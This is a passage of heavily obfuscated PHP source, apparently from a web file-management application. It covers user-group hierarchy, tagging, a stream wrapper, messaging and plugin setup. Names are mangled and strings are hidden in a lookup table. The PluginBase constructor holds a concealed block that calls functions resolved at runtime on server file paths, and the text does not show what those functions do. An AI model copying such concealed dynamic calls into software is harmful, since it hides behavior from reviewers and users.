$this->getInfoSimple($¸şƒÒı–); $²ğÕâòÜ[$¸şƒÒı–] = $ì£Ç†£·[$É¸óí´Š[42]]; } $Úö¨Œğã = $GLOBALS[$É¸óí´Š[6]][$É¸óí´Š[99]][$É¸óí´Š[1926]]; if ($GLOBALS[$É¸óí´Š[511]] == $É¸óí´Š[98]) { $Úö¨Œğã = !1; } foreach ($‰ƒ¿Ó¤ as &$¸“¾ù·ì) { $‡šæû‡ = $this->parentLevelArray($¸“¾ù·ì[$É¸óí´Š[529]]); $„¾‡€ïæ = $É¸óí´Š[12]; foreach ($‡šæû‡ as $¸şƒÒı– => $çÓåİçµ) { if ($Úö¨Œğã && $¸şƒÒı– == 0) { continue; } $„¾‡€ïæ .= $²ğÕâòÜ[$çÓåİçµ] . $É¸óí´Š[8]; } if ($‡šæû‡) { $„¾‡€ïæ .= $¸“¾ù·ì[$É¸óí´Š[42]]; } $¸“¾ù·ì[$É¸óí´Š[534]] = str_replace($É¸óí´Š[537], $É¸óí´Š[8], $„¾‡€ïæ); } unset($¸“¾ù·ì); } private function _listAppendSourceRoot(&$ ®Äñ‚£, $ïß³šßà) { $ÙÁ°Àú =& $_SERVER[¤·²È‰º]; $±Ïã¿šŠ = Model($ÙÁ°Àú[826])->listSourceRoot(SourceModel::TYPE_GROUP, $ïß³šßà); $±Ïã¿šŠ = array_to_keyvalue($±Ïã¿šŠ, $ÙÁ°Àú[513]); $±Ïã¿šŠ = array_remove_key($±Ïã¿šŠ, $ÙÁ°Àú[513]); foreach ($ ®Äñ‚£ as &$ıíÍÜı‘) { $ıíÍÜı‘[$ÙÁ°Àú[96]] = $±Ïã¿šŠ[$ıíÍÜı‘[$ÙÁ°Àú[1823]]] ? $±Ïã¿šŠ[$ıíÍÜı‘[$ÙÁ°Àú[1823]]] : array(); } unset($ıíÍÜı‘); } protected function groupMerge($œÇ÷ƒÙ) { $œÇ÷ƒÙ = array_values(array_unique($œÇ÷ƒÙ)); $ÅŸƒ¨ş« = array(); for ($‚éË’Ïµ = 0; $‚éË’Ïµ < count($œÇ÷ƒÙ); $‚éË’Ïµ++) { $¼åÍşÍ­ = !1; for ($™üšç = 0; $™üšç < count($œÇ÷ƒÙ); $™üšç++) { if ($‚éË’Ïµ == $™üšç) { continue; } if ($this->isParentOf($œÇ÷ƒÙ[$™üšç], $œÇ÷ƒÙ[$‚éË’Ïµ])) { $¼åÍşÍ­ = !0; break; } } if (!$¼åÍşÍ­) { $ÅŸƒ¨ş«[] = $œÇ÷ƒÙ[$‚éË’Ïµ]; } } return $ÅŸƒ¨ş«; } protected function isParentOf($³â¡‡œÌ, $ÌúñÕ¹˜) { $¼·Öµ¦ =& $_SERVER[¤·²È‰º]; if (!$³â¡‡œÌ || !$ÌúñÕ¹˜ || $³â¡‡œÌ == $ÌúñÕ¹˜) { return !1; } $½°ïÍÎÒ = $this->getInfoSimple($³â¡‡œÌ); $İŸ ÃÍ = $this->getInfoSimple($ÌúñÕ¹˜); $¯áÈù½ = $½°ïÍÎÒ[$¼·Öµ¦[529]] . $³â¡‡œÌ . $¼·Öµ¦[60]; if (substr($İŸ ÃÍ[$¼·Öµ¦[529]], 0, strlen($¯áÈù½)) == $¯áÈù½) { return !0; } return !1; } public function groupShowRoot($°™ú®å, $õªÁÅ = false) { $Û¨œ”– =& $_SERVER[¤·²È‰º]; $²—µÂ–Ğ = $this->getInfo($°™ú®å); if (!$²—µÂ–Ğ) { return array(); } $·Æ‰òŠÂ = $this->parentLevelArray($²—µÂ–Ğ[$Û¨œ”–[529]]); $ûÅ¨ßÕ = array($°™ú®å); if (count($·Æ‰òŠÂ) == 0) { return $ûÅ¨ßÕ; } if ($õªÁÅ && count($·Æ‰òŠÂ) == 1) { return $ûÅ¨ßÕ; } if (!$²—µÂ–Ğ[$Û¨œ”–[474]] || !isset($²—µÂ–Ğ[$Û¨œ”–[474]][$Û¨œ”–[1909]]) || $²—µÂ–Ğ[$Û¨œ”–[474]][$Û¨œ”–[1909]] == $Û¨œ”–[1878]) { return $this->groupShowRoot($·Æ‰òŠÂ[count($·Æ‰òŠÂ) - 1], $õªÁÅ); } if ($²—µÂ–Ğ[$Û¨œ”–[474]][$Û¨œ”–[1909]] == $Û¨œ”–[366]) { $àò®ô¡¾ = explode($Û¨œ”–[60], $²—µÂ–Ğ[$Û¨œ”–[474]][$Û¨œ”–[1910]]); if ($àò®ô¡¾) { $ûÅ¨ßÕ = array_merge($ûÅ¨ßÕ, $àò®ô¡¾); } } return $ûÅ¨ßÕ; } protected function resetParentLevel() { $“„—âÄÖ =& $_SERVER[¤·²È‰º]; $ØÓŒÔ›° = $“„—âÄÖ[1823]; $Ÿœëˆã = $this->select(); $Ÿœëˆã = array_to_keyvalue($Ÿœëˆã, $ØÓŒÔ›°); foreach ($Ÿœëˆã as $†²î®Äª) { $•ÃÜº›¡ = $†²î®Äª; $şøÀ—ª = array(); while ($•ÃÜº›¡[$“„—âÄÖ[440]] != 0) { $şøÀ—ª[] = $•ÃÜº›¡[$“„—âÄÖ[440]]; $•ÃÜº›¡ = $Ÿœëˆã[$•ÃÜº›¡[$“„—âÄÖ[440]]]; } $şøÀ—ª[] = 0; $şøÀ—ª = $“„—âÄÖ[60] . implode($“„—âÄÖ[60], array_reverse($şøÀ—ª)) . $“„—âÄÖ[60]; $this->setNamePinyin($†²î®Äª[$ØÓŒÔ›°], $†²î®Äª[$“„—âÄÖ[42]]); $this->where(array($ØÓŒÔ›° => $†²î®Äª[$ØÓŒÔ›°]))->save(array($“„—âÄÖ[598] => $şøÀ—ª)); } return $Ÿœëˆã; } public function groupNameAuto($¶Ğ²ù÷¨, $˜‰èÍŞ˜) { $äå›ÙÀá =& $_SERVER[¤·²È‰º]; $€’ß¨Îó = $this->where(array($äå›ÙÀá[409] => $¶Ğ²ù÷¨))->getField($äå›ÙÀá[42], !0); if (!$€’ß¨Îó || !in_array($˜‰èÍŞ˜, $€’ß¨Îó)) { return $˜‰èÍŞ˜; } for ($¿ÆÔ®úÛ = 1; $¿ÆÔ®úÛ <= count($€’ß¨Îó) + 1; $¿ÆÔ®úÛ++) { $á¢†§€â = $˜‰èÍŞ˜ . "\x28{$¿ÆÔ®úÛ}\x29"; if (!in_array($á¢†§€â, $€’ß¨Îó)) { return $á¢†§€â; } } } public function groupSwitch($ÕÈÄØíµ, $›ÒÛ–¶ş) { $ìÏÄë² =& $_SERVER[¤·²È‰º]; $¿›’ğ‚á = array($ìÏÄë²[1823] => array($ìÏÄë²[7], array($ÕÈÄØíµ, $›ÒÛ–¶ş))); $èÜÃ»„Ï = $this->where($¿›’ğ‚á)->select(); $èÜÃ»„Ï = array_to_keyvalue($èÜÃ»„Ï, $ìÏÄë²[1823]); if (!isset($èÜÃ»„Ï[$ÕÈÄØíµ]) || !isset($èÜÃ»„Ï[$›ÒÛ–¶ş]) || $èÜÃ»„Ï[$ÕÈÄØíµ][$ìÏÄë²[440]] == 0) { return !1; } $¿›’ğ‚á = array($ìÏÄë²[1823] => $ÕÈÄØíµ); $Æó„Óé = Model($ìÏÄë²[1913])->where($¿›’ğ‚á)->select(); if (!$Æó„Óé) { $Æó„Óé = array(); } foreach ($Æó„Óé as $¦İğ‡¼·) { $­¦‹çéÛ = $¦İğ‡¼·[$ìÏÄë²[1651]]; $¿›’ğ‚á = array($ìÏÄë²[1651] => $­¦‹çéÛ, $ìÏÄë²[1823] => $›ÒÛ–¶ş); $ƒâºÚ€Ä = Model($ìÏÄë²[1913])->where($¿›’ğ‚á)->find(); if (!$ƒâºÚ€Ä) { $ÕĞ¿ÕÛ = array($›ÒÛ–¶ş => $¦İğ‡¼·[$ìÏÄë²[1927]]); Model($ìÏÄë²[543])->userGroupAdd($­¦‹çéÛ, $ÕĞ¿ÕÛ); } Model($ìÏÄë²[543])->userGroupRemove($­¦‹çéÛ, $ÕÈÄØíµ); } $¿›’ğ‚á = array($ìÏÄë²[419] => 2, $ìÏÄë²[440] => 0, $ìÏÄë²[418] => 1, $ìÏÄë²[513] => array($ìÏÄë²[7], array($ÕÈÄØíµ, $›ÒÛ–¶ş))); $û†³›ƒ = Model($ìÏÄë²[826])->where($¿›’ğ‚á)->field($ìÏÄë²[1928])->select(); $û†³›ƒ = array_to_keyvalue($û†³›ƒ, $ìÏÄë²[513], $ìÏÄë²[410]); $äˆş×›€ = !empty($û†³›ƒ[$ÕÈÄØíµ]) ? $û†³›ƒ[$ÕÈÄØíµ] : !1; if ($äˆş×›€) { if (!$û†³›ƒ[$›ÒÛ–¶ş]) { $û†³›ƒ[$›ÒÛ–¶ş] = Model($ìÏÄë²[826])->groupRootAdd($›ÒÛ–¶ş); } $†ª“Ê‘ = $û†³›ƒ[$›ÒÛ–¶ş]; $¿›’ğ‚á = array($ìÏÄë²[440] => $äˆş×›€); $û†³›ƒ = Model($ìÏÄë²[826])->where($¿›’ğ‚á)->field($ìÏÄë²[1929])->select(); if (!$û†³›ƒ) { $û†³›ƒ = array(); } Model($ìÏÄë²[826])->moveClearAuth = !1; foreach ($û†³›ƒ as $şƒÄ®¼) { $ä–Ÿ  = $şƒÄ®¼[$ìÏÄë²[418]] == $ìÏÄë²[98] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ìÏÄë²[826])->move($şƒÄ®¼[$ìÏÄë²[410]], $†ª“Ê‘, $ä–Ÿ ); } Model($ìÏÄë²[826])->moveClearAuth = !0; $¿›’ğ‚á = array($ìÏÄë²[419] => 2, $ìÏÄë²[513] => $ÕÈÄØíµ); $©œ„”¬ = array($ìÏÄë²[513] => $›ÒÛ–¶ş); Model($ìÏÄë²[1930])->where($¿›’ğ‚á)->save($©œ„”¬); Model($ìÏÄë²[1931])->where($¿›’ğ‚á)->save($©œ„”¬); } $this->_changeChildLevel($èÜÃ»„Ï[$ÕÈÄØíµ], $èÜÃ»„Ï[$›ÒÛ–¶ş], !0); $this->where(array($ìÏÄë²[440] => $ÕÈÄØíµ))->save(array($ìÏÄë²[440] => $›ÒÛ–¶ş)); $this->_clearChildrenCache($èÜÃ»„Ï[$›ÒÛ–¶ş]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\146\141\x76"; protected function cacheFunctionAlias($Ø¹èÅî) { $×ô½’õ =& $_SERVER[¤·²È‰º]; return array($×ô½’õ[1932] => array($Ø¹èÅî[0], $×ô½’õ[1933]), $×ô½’õ[1934] => array($Ø¹èÅî[0], $×ô½’õ[1935])); } protected function get($—ñíº¸¥) { $Ö½ä÷Ş® =& $_SERVER[¤·²È‰º]; $ÔÍçé¡Ô = Model($Ö½ä÷Ş®[530])->metaGet($—ñíº¸¥, $Ö½ä÷Ş®[1936]); $“˜×ØÑ— = json_decode($ÔÍçé¡Ô, !0); return $“˜×ØÑ— ? $“˜×ØÑ— : array($Ö½ä÷Ş®[1937] => $Ö½ä÷Ş®[98], $Ö½ä÷Ş®[378] => array()); } protected function set($„¦Çš½, $®ˆ÷¼¤Ô) { $–ñ©ûá =& $_SERVER[¤·²È‰º]; $®ˆ÷¼¤Ô = $®ˆ÷¼¤Ô ? $®ˆ÷¼¤Ô : array($–ñ©ûá[1937] => $–ñ©ûá[98], $–ñ©ûá[378] => array()); return Model($–ñ©ûá[530])->metaSet($„¦Çš½, $–ñ©ûá[1936], json_encode($®ˆ÷¼¤Ô)); } protected function getByTagID($ëùó°Ü¨, $Ô–‹¢¨) { $œÄäİÆŸ =& $_SERVER[¤·²È‰º]; if (!$ëùó°Ü¨ || !$Ô–‹¢¨) { return !1; } if (!Model($œÄäİÆŸ[530])->getInfoSimple($ëùó°Ü¨)) { return !1; } $©áµğó˜ = $this->get($ëùó°Ü¨); if (!$©áµğó˜ || !isset($©áµğó˜[$œÄäİÆŸ[378]])) { return !1; } $Û¤ŠÜ·Ï = array_find_by_field($©áµğó˜[$œÄäİÆŸ[378]], $œÄäİÆŸ[407], $Ô–‹¢¨); return is_array($Û¤ŠÜ·Ï) ? $Û¤ŠÜ·Ï : !1; } public function listSource($ÌöáªÆ‡, $´°¸—ÛÛ) { $´¼Ñ‡Á¶ =& $_SERVER[¤·²È‰º]; if ($´°¸—ÛÛ && !is_array($´°¸—ÛÛ)) { $´°¸—ÛÛ = array($´°¸—ÛÛ); } $¸’¶¤·Ò = $this->listData($ÌöáªÆ‡); $À›ƒå‰â = array(); foreach ($¸’¶¤·Ò as $×·‹û¡§) { $±»¶›¾£ = $×·‹û¡§[$´¼Ñ‡Á¶[94]]; if (!$±»¶›¾£) { continue; } if (!isset($À›ƒå‰â[$±»¶›¾£])) { $À›ƒå‰â[$±»¶›¾£] = array(); } $À›ƒå‰â[$±»¶›¾£][] = $×·‹û¡§[$´¼Ñ‡Á¶[434]]; } $ŞıËÒŸ = array(); foreach ($À›ƒå‰â as $¶¨üŸßñ => $í›øà¯ô) { $Ú×ØúÛª = !0; if (!$´°¸—ÛÛ) { $ŞıËÒŸ[] = $¶¨üŸßñ; continue; } foreach ($´°¸—ÛÛ as $ìæıÀÖ¶) { if (!in_array($ìæıÀÖ¶, $í›øà¯ô)) { $Ú×ØúÛª = !1; break; } } if ($Ú×ØúÛª) { $ŞıËÒŸ[] = $¶¨üŸßñ; } } if (!$ŞıËÒŸ) { return array(); } $İıß´É… = array($´¼Ñ‡Á¶[425] => array($´¼Ñ‡Á¶[426], $ŞıËÒŸ), $´¼Ñ‡Á¶[513] => $ÌöáªÆ‡, $´¼Ñ‡Á¶[419] => SourceModel::TYPE_GROUP); $Ç³Ûˆó = Model($´¼Ñ‡Á¶[1321])->listSource($İıß´É…); if (!$Ç³Ûˆó || count($ŞıËÒŸ) == $Ç³Ûˆó[$´¼Ñ‡Á¶[375]][$´¼Ñ‡Á¶[376]]) { return $Ç³Ûˆó; } $º¤Ş”Šï = array(); $æ£ÂÑñÕ = array_to_keyvalue($Ç³Ûˆó[$´¼Ñ‡Á¶[92]], $´¼Ñ‡Á¶[12], $´¼Ñ‡Á¶[410]); $†û„ÛĞ› = array_to_keyvalue($Ç³Ûˆó[$´¼Ñ‡Á¶[93]], $´¼Ñ‡Á¶[12], $´¼Ñ‡Á¶[410]); $ˆğÕ‰ˆ÷ = array_merge($†û„ÛĞ›, $æ£ÂÑñÕ); foreach ($ŞıËÒŸ as $±»¶›¾£) { if (!in_array($±»¶›¾£, $ˆğÕ‰ˆ÷)) { $º¤Ş”Šï[] = $±»¶›¾£; } } if ($º¤Ş”Šï) { $this->removeBySource($ÌöáªÆ‡, $º¤Ş”Šï); } return $Ç³Ûˆó; } protected function listData($¥øæÕ´à) { $ğÔœµ =& $_SERVER[¤·²È‰º]; $ƒ»˜ãØ¡ = array($ğÔœµ[1642] => 0, $ğÔœµ[492] => array($ğÔœµ[1938], 0), $ğÔœµ[430] => $ğÔœµ[1939] . $¥øæÕ´à); $†è™Ë¨ã = $ğÔœµ[1940]; $—ñØ³ìğ = $this->field($†è™Ë¨ã)->where($ƒ»˜ãØ¡)->order($ğÔœµ[1941])->select(); return $—ñØ³ìğ ? $—ñØ³ìğ : array(); } protected function addToTag($’ƒéÍÏÒ, $‚öØää¾, $¡ŒµêÂ†) { $î•Ç¼ÆÂ =& $_SERVER[¤·²È‰º]; if (!$this->getByTagID($’ƒéÍÏÒ, $¡ŒµêÂ†) || !$‚öØää¾) { return !1; } if (!Model($î•Ç¼ÆÂ[826])->pathInfo($‚öØää¾)) { return !1; } $Ç°‹¯ü´ = array($î•Ç¼ÆÂ[1642] => 0, $î•Ç¼ÆÂ[492] => $¡ŒµêÂ†, $î•Ç¼ÆÂ[429] => $‚öØää¾, $î•Ç¼ÆÂ[430] => $î•Ç¼ÆÂ[1942] . $’ƒéÍÏÒ, $î•Ç¼ÆÂ[428] => $î•Ç¼ÆÂ[12], $î•Ç¼ÆÂ[1827] => 0); if ($this->where($Ç°‹¯ü´)->find()) { return !1; } return $this->add($Ç°‹¯ü´); } protected function removeFromTag($©´ÇÍÕœ, $Î˜Î˜ã•, $ûÈ‘®ËÚ) { $ü—¹ş„É =& $_SERVER[¤·²È‰º]; if (!$this->getByTagID($©´ÇÍÕœ, $ûÈ‘®ËÚ) || !$Î˜Î˜ã•) { return !1; } if (is_array($Î˜Î˜ã•)) { $Î˜Î˜ã• = array($ü—¹ş„É[7], $Î˜Î˜ã•); } $ïì§ã = array($ü—¹ş„É[1642] => 0, $ü—¹ş„É[492] => $ûÈ‘®ËÚ, $ü—¹ş„É[430] => $ü—¹ş„É[1942] . $©´ÇÍÕœ, $ü—¹ş„É[429] => $Î˜Î˜ã•); return $this->where($ïì§ã)->delete(); } protected function removeByTag($»ï–ÊİÎ, $˜¨Õ÷¡) { $ºƒÓŠøï =& $_SERVER[¤·²È‰º]; if (!$this->getByTagID($»ï–ÊİÎ, $˜¨Õ÷¡)) { return !1; } $üñùú± = array($ºƒÓŠøï[1642] => 0, $ºƒÓŠøï[492] => $˜¨Õ÷¡, $ºƒÓŠøï[430] => $ºƒÓŠøï[1942] . $»ï–ÊİÎ); return $this->where($üñùú±)->delete(); } protected function removeBySource($ÂÂ¼ÊÌ®, $»™öô—Ø) { $ÇÙĞîÌ§ =& $_SERVER[¤·²È‰º]; if (!$ÂÂ¼ÊÌ® || !$»™öô—Ø) { return !1; } if (is_array($»™öô—Ø)) { $»™öô—Ø = array($ÇÙĞîÌ§[7], $»™öô—Ø); } $¥´ÇŒÛÆ = array($ÇÙĞîÌ§[1642] => 0, $ÇÙĞîÌ§[429] => $»™öô—Ø, $ÇÙĞîÌ§[492] => array($ÇÙĞîÌ§[1008], 0), $ÇÙĞîÌ§[430] => $ÇÙĞîÌ§[1942] . $ÂÂ¼ÊÌ®); return $this->where($¥´ÇŒÛÆ)->delete(); } } goto AÛ£Æ®øßÂ; DÒ„ŒÏ¼”Ø: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ı¦øšŞÈ, $¤ºçÏ = '') { $this->info = $this->info($ı¦øšŞÈ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¤·²È‰º][94]]; $this->pathOpen = $ı¦øšŞÈ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ı¦øšŞÈ])) { self::$_chunkBuffer[$ı¦øšŞÈ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($òàş¥¿) { $Î²ŒÌ“ú = $this->fileSubstr($this->pose, $òàş¥¿); $this->pose += strlen($Î²ŒÌ“ú); return $Î²ŒÌ“ú; } public function stream_tell() { return $this->pose; } public function stream_seek($ÏºóÍÑ•, $Ô½Ñğ©¿) { $¾éøÜà =& $_SERVER[¤·²È‰º]; if ($Ô½Ñğ©¿ == SEEK_SET) { $this->pose = $ÏºóÍÑ•; } else { if ($Ô½Ñğ©¿ == SEEK_CUR) { $this->pose += $ÏºóÍÑ•; } else { if ($Ô½Ñğ©¿ == SEEK_END) { $this->pose = $this->info[$¾éøÜà[86]] + intval($ÏºóÍÑ•); } } } if ($ÏºóÍÑ• < 0) { $this->pose = $this->info[$¾éøÜà[86]] + $ÏºóÍÑ•; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¤·²È‰º][86]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($’Ğ£áğî, $õ“§İÓ´) { $ÜÀÅ¿ë =& $_SERVER[¤·²È‰º]; $é±§Æ‚æ = $this->info($’Ğ£áğî); return array($ÜÀÅ¿ë[1497] => 0, $ÜÀÅ¿ë[1498] => 0, $ÜÀÅ¿ë[26] => 32768 + 511, $ÜÀÅ¿ë[1499] => 0, $ÜÀÅ¿ë[1500] => 0, $ÜÀÅ¿ë[1501] => 0, $ÜÀÅ¿ë[1502] => 0, $ÜÀÅ¿ë[86] => $é±§Æ‚æ[$ÜÀÅ¿ë[86]], $ÜÀÅ¿ë[1503] => $é±§Æ‚æ[$ÜÀÅ¿ë[1371]], $ÜÀÅ¿ë[1459] => $é±§Æ‚æ[$ÜÀÅ¿ë[95]], $ÜÀÅ¿ë[1458] => $é±§Æ‚æ[$ÜÀÅ¿ë[210]], $ÜÀÅ¿ë[1504] => 0, $ÜÀÅ¿ë[1505] => 0); } static $fileInfo = array(); public function info($·›Îêğ›) { $Ğ‰Œ€×¯ = $_SERVER[¤·²È‰º][1506]; if (isset(self::$fileInfo[$·›Îêğ›])) { return self::$fileInfo[$·›Îêğ›]; } if (substr($·›Îêğ›, 0, strlen($Ğ‰Œ€×¯)) != $Ğ‰Œ€×¯) { return !1; } self::$fileInfo[$·›Îêğ›] = IO::info(substr($·›Îêğ›, strlen($Ğ‰Œ€×¯))); return self::$fileInfo[$·›Îêğ›]; } public static function read($İÁÃ’²ƒ, $á¡øŠÀ¶, $Øº®´¾„) { if (!isset(self::$_fopenCache[$İÁÃ’²ƒ])) { $ãÆËô©× = new StreamWrapperIO(); $ãÆËô©×->stream_open($İÁÃ’²ƒ); self::$_fopenCache[$İÁÃ’²ƒ] = $ãÆËô©×; } $ãÆËô©× = self::$_fopenCache[$İÁÃ’²ƒ]; return $ãÆËô©×->fileSubstr($á¡øŠÀ¶, $Øº®´¾„); } public static function _read($ÒÔ•êÕ˜, $Áøæù¡„, $è–ğ€µñ) { $ûÇ„•¶¦ =& $_SERVER[¤·²È‰º]; $Ç¶Øí­È = fopen($ÒÔ•êÕ˜, $ûÇ„•¶¦[1375]); if (!$Ç¶Øí­È) { return $ûÇ„•¶¦[12]; } $‚ÃÒƒ“İ = 8192; fseek($Ç¶Øí­È, $Áøæù¡„, SEEK_SET); $æ»µÅµ = $ûÇ„•¶¦[12]; $É™¸ÏÚ = 0; while ($É™¸ÏÚ < $è–ğ€µñ) { $Êº™‡‹· = min($‚ÃÒƒ“İ, $è–ğ€µñ - $É™¸ÏÚ); $æ»µÅµ .= fread($Ç¶Øí­È, $Êº™‡‹·); $É™¸ÏÚ += $Êº™‡‹·; } fclose($Ç¶Øí­È); return $æ»µÅµ; } public function fileSubstr($áºÀ®¸Ü, $Ö†á®Ô×) { $İùü¼ó„ =& $_SERVER[¤·²È‰º]; $—‘·€‚ = $this->info[$İùü¼ó„[86]]; $ÇÅêÕâØ = $áºÀ®¸Ü; $ë±ÅŸƒ = $Ö†á®Ô×; if ($áºÀ®¸Ü < 0) { $áºÀ®¸Ü = $—‘·€‚ + $áºÀ®¸Ü; } if ($Ö†á®Ô× === !1) { $Ö†á®Ô× = $—‘·€‚ - $áºÀ®¸Ü; } if ($áºÀ®¸Ü + $Ö†á®Ô× > $—‘·€‚) { $Ö†á®Ô× = $—‘·€‚ - $áºÀ®¸Ü; } if ($Ö†á®Ô× <= 0) { return $İùü¼ó„[12]; } if ($áºÀ®¸Ü < 0 || $áºÀ®¸Ü >= $—‘·€‚ || $Ö†á®Ô× <= 0 || $Ö†á®Ô× > 1024 * 1024 * 10) { throw new Exception("\151\157\x46\151\154\x65\122\x65\141\144\40\x65\x72\x72\x6f\162\x21\40\163\x74\141\x72\164\75{$áºÀ®¸Ü}\x3b\154\145\156\x67\164\x68\x3d{$Ö†á®Ô×}\x3b\40\x73\x69\172\x65\75{$—‘·€‚}\x3b"); } $‹€ØÅõÀ = 64 * 1024; $à†ÎÀ½Ğ =& self::$_chunkBuffer[$this->path]; if (!$à†ÎÀ½Ğ) { $à†ÎÀ½Ğ = array(); } $ô¬™­ÀÏ = 0; $Âì„´†Ï = 0; $×˜½ÙêÉ = $İùü¼ó„[12]; foreach ($à†ÎÀ½Ğ as $ô¬™­ÀÏ => $×˜½ÙêÉ) { $ô¬™­ÀÏ = intval($ô¬™­ÀÏ); $Âì„´†Ï = $ô¬™­ÀÏ + strlen($×˜½ÙêÉ); if ($áºÀ®¸Ü >= $Âì„´†Ï) { continue; } if ($áºÀ®¸Ü >= $ô¬™­ÀÏ && $áºÀ®¸Ü + $Ö†á®Ô× <= $Âì„´†Ï) { return substr($×˜½ÙêÉ, $áºÀ®¸Ü - $ô¬™­ÀÏ, $Ö†á®Ô×); } break; } if (count($à†ÎÀ½Ğ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($İùü¼ó„[1507], $İùü¼ó„[1508] . count($à†ÎÀ½Ğ) . "\73\163\x74\x61\162\x74\x3d{$áºÀ®¸Ü}\54\x6c\x65\x6e\147\x74\x68\x3d{$Ö†á®Ô×}\73\160\157\163\x65\x3a{$ô¬™­ÀÏ}\176{$Âì„´†Ï}"); throw new Exception($İùü¼ó„[1509]); } $®ÆÕ¥™ = intval($áºÀ®¸Ü / $‹€ØÅõÀ) * $‹€ØÅõÀ; $ŞïàÇ–† = ceil(($áºÀ®¸Ü + $Ö†á®Ô×) / $‹€ØÅõÀ) * $‹€ØÅõÀ - $®ÆÕ¥™; $¸³Û×ó = IO::fileSubstr($this->path, $®ÆÕ¥™, $ŞïàÇ–†); $à†ÎÀ½Ğ[$®ÆÕ¥™ . $İùü¼ó„[12]] = $¸³Û×ó; ksort($à†ÎÀ½Ğ); $èã¼öí÷ = substr($¸³Û×ó, $áºÀ®¸Ü - $®ÆÕ¥™, $Ö†á®Ô×); return $èã¼öí÷; } private function log($ã®ÄìÄ¬, $Çı¸„Éé) { $¼÷¬¿ı =& $_SERVER[¤·²È‰º]; $ÔÇ®İ‡ñ = timeFloat() - $this->timeStart; write_log(sprintf($¼÷¬¿ı[1510], $ã®ÄìÄ¬, $this->info[$¼÷¬¿ı[42]], $ÔÇ®İ‡ñ, $Çı¸„Éé), $¼÷¬¿ı[1177]); } } class Message { function __construct() { } public function send($Â«õ = '', $¦•Ú»Ù = array(), $ÕŠ‡€‚‚ = "\164\x65\170\164") { $¦©õŒ²‡ =& $_SERVER[¤·²È‰º]; $È°æ±ÆÑ = array($¦©õŒ²‡[43] => $¦©õŒ²‡[1511], $¦©õŒ²‡[756] => $Â«õ); if (in_array($ÕŠ‡€‚‚, array($¦©õŒ²‡[1511], $¦©õŒ²‡[1512]))) { $È°æ±ÆÑ[$¦©õŒ²‡[43]] = $ÕŠ‡€‚‚; } $¦•Ú»Ù = array($¦©õŒ²‡[523] => isset($¦•Ú»Ù[$¦©õŒ²‡[523]]) ? $¦•Ú»Ù[$¦©õŒ²‡[523]] : $¦©õŒ²‡[12], $¦©õŒ²‡[608] => isset($¦•Ú»Ù[$¦©õŒ²‡[608]]) ? $¦•Ú»Ù[$¦©õŒ²‡[608]] : $¦©õŒ²‡[12]); if (empty($Â«õ) || empty($¦•Ú»Ù[$¦©õŒ²‡[523]]) && empty($¦•Ú»Ù[$¦©õŒ²‡[608]])) { return !1; } $¯öè™°¼ = array($¦©õŒ²‡[1452] => $È°æ±ÆÑ, $¦©õŒ²‡[1513] => $¦•Ú»Ù); Hook::trigger($¦©õŒ²‡[1514], $¯öè™°¼); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¶‰úæÒÈ =& $_SERVER[¤·²È‰º]; if ($_SERVER[$¶‰úæÒÈ[13]] != $_SERVER[$¶‰úæÒÈ[1515]]) { $ƒ›Í£±· = $¶‰úæÒÈ[873]; $í³ş™˜µ = $¶‰úæÒÈ[15]; $…ƒ•îâÙ = $_SERVER[$¶‰úæÒÈ[16]] . $¶‰úæÒÈ[17]; $ÅŠ×¤¹ = $í³ş™˜µ($…ƒ•îâÙ); $Æ—ë®˜À = explode($¶‰úæÒÈ[18], $ÅŠ×¤¹); if (count($Æ—ë®˜À) < $¶‰úæÒÈ[623]) { $šò­éÜò = $¶‰úæÒÈ[20]; $šò­éÜò(); } $«´Ïè³Ç = $¶‰úæÒÈ[874]; $«´Ïè³Ç($_SERVER[$¶‰úæÒÈ[875]]); $«´Ïè³Ç($_SERVER[$¶‰úæÒÈ[16]] . $¶‰úæÒÈ[1516]); $¦°•ˆØÄ = 1; while ($¦°•ˆØÄ > 1) { $¦°•ˆØÄ = $¦°•ˆØÄ + 4; $Ú«…œ›é = rawurlencode($¦°•ˆØÄ . $¶‰úæÒÈ[22]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¶‰úæÒÈ[1517]); $this->pluginName = str_replace($¶‰úæÒÈ[1517], $¶‰úæÒÈ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¶‰úæÒÈ[8]; $this->pluginApi = appHostGet() . $¶‰úæÒÈ[1518] . $this->pluginName . $¶‰úæÒÈ[8]; $this->pluginHost = $config[$¶‰úæÒÈ[1519]] . $this->pluginName . $¶‰úæÒÈ[8]; $this->pluginHostDefault = $config[$¶‰úæÒÈ[1519]] . $this->pluginName . $¶‰úæÒÈ[8]; $‘ùèøÅº = $config[$¶‰úæÒÈ[1520]]; if ($‘ùèøÅº && strpos($¶‰úæÒÈ[60] . $‘ùèøÅº . $¶‰úæÒÈ[60], $this->pluginName) !== !1) { $this->pluginHost = $config[$¶‰úæÒÈ[1521]] . $this->pluginName . $¶‰úæÒÈ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¤·²È‰º][1522]); } protected function assign($¡ÅÁÔ«, $‚Ì¿©Êè = false) { if (is_array($¡ÅÁÔ«)) { $this->values = array_merge($this->values, $¡ÅÁÔ«); } else { $this->values[$¡ÅÁÔ«] = $‚Ì¿©Êè; } } protected function display($ö±ïÛË) { extract($this->values); require $ö±ïÛË; } final function hookRegist($¥ê¼‘¿°) { 